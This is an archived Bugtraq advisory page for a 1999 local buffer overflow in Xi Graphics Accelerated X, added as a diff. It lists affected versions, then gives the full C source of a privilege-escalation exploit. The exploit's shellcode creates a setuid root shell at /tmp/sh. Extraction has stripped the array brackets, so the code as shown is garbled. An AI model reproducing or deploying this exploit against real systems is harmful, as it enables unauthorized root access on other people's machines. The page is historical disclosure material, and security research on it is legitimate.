@@ -1,0 +1,100 @@
+<p><b><span style="font-size: 18pt;">Accelerated X Buffer Overflow Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/488/info">info</a><br><a href="http://www.securityfocus.com/bid/488/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/488/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/488/solution">solution</a><br><a href="http://www.securityfocus.com/bid/488/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				488
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 25 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 25 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq in a KSRT advisory by KSRT Contact Account &lt;ksrt@ksrt.org&gt; on June 26, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Xi Graphics Accelerated X 5.0 <br/>
+					
+				
+					Xi Graphics Accelerated X 4.0 .x<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Xi Graphics Accelerated X 5.0.2 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	--- SDIaccelX.c ----<br/>/*<br/> * SDI linux exploit for Accelerate-X<br/> * Sekure SDI - Brazilian Information Security Team<br/> * by c0nd0r &lt;condor@sekure.org&gt;<br/> *<br/> * This script will exploit a vulnerability found by KSRT team<br/> * in the Accelerate-X Xserver &lt;=5.0.<br/> *<br/> * --------------------------------------------------------------------<br/> * The vulnerable buffer was small so we've changed the usual order to:<br/> * garbageeiplots nopshellcode<br/> * BTW, I've also changed the code to execute, it will create a setuid<br/> * shell owned by the superuser at /tmp/sh.<br/> * --------------------------------------------------------------------<br/> *<br/> * Warning: DO NOT USE THIS TOOL FOR ILICIT ACTIVITIES! We take no<br/> *          responsability.<br/> *<br/> * Greets to jamez, bishop, bahamas, stderr, dumped, paranoia,<br/> *           marty (NORDO!), vader, fcon, slide, c_orb and<br/> *           specially to my sasazita. Also toxyn.org, pulhas.org,<br/> *           superbofh.org (Phibernet rox) and el8.org.<br/> *<br/> * Laughs - lame guys who hacked the senado/planalto.gov.br<br/> * pay some attention to the site: #no_exploit (good point).<br/> * see you at #uground (irc.brasnet.org)<br/> */<br/><br/>#include &lt;stdio.h&gt;<br/><br/>/* generic shellcode */<br/>char shellcode =<br/>        "\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"<br/>        "\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"<br/>        "\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"<br/>        "\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"<br/>        "\x40\xcd\x80\xe8\xca\xff\xff\xff"<br/>        "/bin/sh -c cp /bin/sh /tmp/sh; chmod 6755 /tmp/sh";<br/><br/>main ( int argc, char *argv ) {<br/> char buf1024;<br/> int x, y, offset=1000;<br/> long addr;<br/> int joe;<br/><br/> if (argc &gt; 1)<br/>   offset = atoi ( argv1);<br/><br/> /* return address */<br/> addr = (long) &amp;joe + offset;<br/><br/> buf0 = ':';<br/> for ( x = 1; x &lt; 53; x++)<br/>  bufx = 'X';<br/><br/> bufx++ = (addr &amp; 0x000000ff);<br/> bufx++ = (addr &amp; 0x0000ff00) &gt;&gt; 8;<br/> bufx++ = (addr &amp; 0x00ff0000) &gt;&gt; 16;<br/> bufx++ = (addr &amp; 0xff000000) &gt;&gt; 24;<br/><br/> for (  ; x &lt; 500; x++)<br/>  bufx = 0x90;<br/><br/> for ( y = 0; y &lt; strlen(shellcode); y++, x++)<br/>  bufx = shellcodey;<br/><br/> fprintf (stderr, "\nSDI Xaccel - Offset: %d | Addr: 0x%x\n\n",<br/>          offset, addr);<br/><br/> bufstrlen(buf) = '\0';<br/><br/> execl ( "/usr/X11R6/bin/Xaccel", "Xaccel", buf, (char *)0);<br/><br/>// setenv ( "EGG", buf, 1);<br/>// system ( "/bin/sh");<br/><br/>}<br/>----- EOF ----------
+	
+		<ul>
+</ul>
+</div>
